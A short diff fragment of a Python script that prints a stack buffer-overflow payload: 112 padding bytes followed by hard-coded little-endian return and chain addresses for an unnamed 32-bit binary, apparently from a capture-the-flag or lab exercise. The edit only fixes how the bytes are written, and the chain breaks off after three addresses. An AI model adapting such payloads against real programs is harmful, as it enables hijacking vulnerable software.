@@ -1,5 +1,5 @@
 import sys
-sys.stdout.write(b"a"*112 +
+sys.stdout.buffer.write(b"a"*112 +
                  0x080563d0.to_bytes(4,"little") +
                  0x080481d1.to_bytes(4,"little") +
                  0xffffffff.to_bytes(4,"little") +
